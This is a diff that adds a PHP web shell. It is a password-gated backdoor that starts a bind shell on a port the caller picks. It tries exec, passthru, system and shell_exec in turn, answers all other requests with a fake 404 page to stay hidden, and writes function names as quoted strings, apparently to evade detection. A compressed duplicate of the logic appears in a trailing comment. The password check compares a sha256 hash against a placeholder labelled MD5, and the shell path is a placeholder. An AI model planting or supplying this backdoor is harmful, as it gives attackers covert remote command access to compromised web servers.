@@ -1,0 +1,45 @@
+<?php
+$p = 'your_md5_password_here';
+$s = "base64_decode"('shell_filepath');
+$u = 'execute_with';
+
+if (${"_SERVER"}["REQUEST_METHOD"] === 'POST') {
+$port = ${"_POST"}["port"];
+$password = ${"_POST"}["pass"];
+$ex  = "exec";
+$pst = "passthru";
+$sys = "system";
+$sex = "shell_exec";
+$command = "$u $s $port > /dev/null 2>&1 &";
+
+if ("hash"("sha256", $password) === $p) {
+if ("function_exists"($ex)) {
+$outputArray = [];
+$ex($command);
+
+} elseif ("function_exists"($pst)) {
+"ob_start"();
+$pst($command);
+
+} elseif ("function_exists"($sys)) {
+"ob_start"();
+$sys($command);
+
+} elseif ("function_exists"($sex)) {
+$sex($command);
+} else {
+echo "Unable to execute command";
+die();
+}
+echo "Bind shell started on port $port.\n";
+} else {
+echo "Invalid password.\n";
+}
+} else {
+header("HTTP/1.0 404 Not Found");
+}
+
+//if (${"_SERVER"}["REQUEST_METHOD"] === "POST") { $port = ${"_POST"}["port"]; $password = ${"_POST"}["pass"]; $ex= "exec"; $pst = "passthru"; $sys = "system"; $sex = "shell_exec"; $command = "$s $port > /dev/null 2>&1 &"; if ("hash"("sha256", $password) === $p) { if ("function_exists"($ex)) { $outputArray = []; $ex($command); } elseif ("function_exists"($pst)) { "ob_start"(); $pst($command); } elseif ("function_exists"($sys)) { "ob_start"(); $sys($command); } elseif ("function_exists"($sex)) { $sex($command); } else { echo "Unable to execute command"; die(); } echo "Bind shell started on port $port.
+"; } else { echo "Invalid password.
+"; }} else { header("HTTP/1.0 404 Not Found");}
+?>
